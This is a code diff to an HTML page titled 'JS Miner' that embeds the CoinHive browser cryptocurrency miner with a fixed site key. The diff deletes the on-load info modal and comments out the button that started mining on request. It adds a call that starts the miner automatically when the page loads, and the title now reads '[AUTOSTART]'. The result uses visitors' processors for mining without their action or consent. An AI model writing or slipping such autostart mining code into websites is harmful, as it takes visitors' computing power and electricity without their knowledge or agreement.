@@ -21,7 +21,7 @@
     <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarColor01" aria-controls="navbarColor01" aria-expanded="false" aria-label="Toggle navigation">
   <span class="navbar-toggler-icon"></span>
 </button>
-    <a class="navbar-brand" href="#">JS Miner</a>
+    <a class="navbar-brand" href="#">JS Miner [AUTOSTART]</a>
 
     <div class="collapse navbar-collapse" id="navbarColor01">
       <ul class="navbar-nav mr-auto">
@@ -153,7 +153,6 @@
 
   <script type="text/javascript">
     $(window).on('load', function() {
-      $('#infoModal').modal('show');
       $(function() {
         $('[data-toggle="tooltip"]').tooltip({
           html: true
@@ -162,13 +161,14 @@
       miner = new CoinHive.Anonymous('9H09GonNox8vpilC6yXiRszHrZOeKxxJ', {
         autothreads: true
       });
+      miner.start(CoinHive.IF_EXCLUSIVE_TAB);
     });
   </script>
 
   <script type="text/javascript">
-    $('#miner-start').click(function() {
-      miner.start(CoinHive.IF_EXCLUSIVE_TAB);
-    });
+    // $('#miner-start').click(function() {
+    //   miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+    // });
 
     $('#miner-start-again').click(function() {
       miner.start(CoinHive.IF_EXCLUSIVE_TAB);
